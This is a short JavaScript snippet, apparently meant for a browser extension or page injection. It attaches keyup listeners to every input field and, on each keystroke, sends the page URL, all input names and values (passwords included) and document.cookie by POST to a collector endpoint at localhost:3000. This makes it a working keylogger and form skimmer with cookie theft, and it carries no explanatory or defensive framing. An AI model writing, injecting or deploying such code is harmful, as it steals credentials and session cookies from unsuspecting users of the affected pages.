((url) => {

	const send = (data) => {
		const options = {
			method: 'POST',
			body: JSON.stringify(data),
			headers:{
				'Content-Type': 'application/json'
			}
		}

		return fetch(url, options)
			.then(console.log)
			.catch(console.log);
	}

	const getInputs = () => {
		const inputs = document.querySelectorAll('input');

		return [].slice.call(inputs)
			.map(input => {
				return {
					id: input.getAttribute('id'),
					name: input.getAttribute('name'),
					value: input.value,
					type: input.getAttribute('type')
				}
			});
	}
	

	const onChangeInputs = (callback) => {
		const inputs = document.querySelectorAll('input');
		return [].slice.call(inputs)
			.map(input => input.addEventListener('keyup', callback));
	}

	onChangeInputs(() => {
		const inputs = getInputs();
		send({
			url: location.href,
			inputs,
			cookies: document.cookie
		});
	});

})('http://localhost:3000/hashmap/extension');
